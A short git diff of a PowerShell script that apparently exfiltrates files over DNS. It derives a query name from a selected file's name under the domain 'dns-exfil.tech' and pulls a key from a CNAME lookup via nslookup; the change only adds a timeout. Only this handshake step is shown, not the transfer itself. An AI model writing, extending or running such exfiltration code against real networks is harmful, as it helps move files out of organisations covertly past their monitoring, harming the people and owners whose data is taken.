@@ -21,7 +21,7 @@
     $keyDNSRecord = "up.start." + $openFile.SafeFileName.Replace(".","-").Replace(" ","_") + ".dns-exfil.tech"
 
     #Collect the key from the NSlookup
-    $key = nslookup -type=CNAME $keyDNSRecord 2>$null  | Select-String -Pattern "canonical name = (.*)" | Foreach-object {$_.Matches} | ForEach-Object {$_.Groups[1].Value}
+    $key = nslookup -type=CNAME -timeout=10 $keyDNSRecord 2>$null  | Select-String -Pattern "canonical name = (.*)" | Foreach-object {$_.Matches} | ForEach-Object {$_.Groups[1].Value}
 
     #Verify that a key was collected from NSlookup
     If (($key -eq "ERROR") -or ($key -eq $null)) { 
